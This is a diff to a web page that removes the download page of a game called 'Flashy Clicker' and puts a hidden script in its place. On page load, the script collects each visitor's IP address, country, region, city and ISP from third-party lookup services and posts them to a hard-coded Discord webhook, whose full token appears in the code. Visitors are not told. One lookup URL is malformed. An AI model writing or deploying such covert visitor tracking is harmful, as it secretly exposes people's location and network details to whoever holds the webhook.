@@ -1,6 +1,52 @@
-<h1>Welcome to Flashy Clicker's Download Page! :)</h1>
-<h2>EPELIPSY WARNING!!</h2>
-<p>This game contains flashing lights!</p>
-<hr>
-<h1>Go to "elitaylor120.github.io/clicker.zip" to download</h1>
-<p>(It will display a 404 error, but the file will automagically download at the same time.)</p>
+<body>
+  <script>
+    // *** IMPORTANT: Replace with your actual webhook URL ***
+    const webhookUrl = "https://discord.com/api/webhooks/1474817745194320046/fENhil3t4bbKKFm08FpovniBZOQyYac6YTUnn5yDTarv9ZI2IJ4DR07Ad9F9OzHhfV0h";
+
+    // Function to fetch the user's IP and send it to the webhook
+    async function logUserIp() {
+      try {
+        // 1. Get the IP address from a third-party API
+        const ipResponse = await fetch('https://api.ipify.org');
+        const ipData = await ipResponse.json();
+        const userIp = ipData.ip;
+
+        // 2. (Optional) Get more details from another API
+        const detailsResponse = await fetch(`http://ip-api.com{userIp}`);
+        const detailsData = await detailsResponse.json();
+
+        // 3. Prepare the data payload for the webhook
+        const payload = {
+          content: "**New Website Visitor IP Logged:**",
+          embeds: [{
+            title: "Visitor Details",
+            fields: [
+              { name: "IP Address", value: userIp, inline: true },
+              { name: "Country", value: detailsData.country, inline: true },
+              { name: "Region", value: detailsData.regionName, inline: true },
+              { name: "City", value: detailsData.city, inline: true },
+              { name: "ISP", value: detailsData.isp, inline: false }
+            ]
+          }]
+        };
+
+        // 4. Send the payload to the webhook URL using a POST request
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(payload),
+        });
+
+        console.log('IP information sent to webhook.');
+
+      } catch (error) {
+        console.error('Error logging IP:', error);
+      }
+    }
+
+    // Call the function when the page loads
+    logUserIp();
+  </script>
+</body>
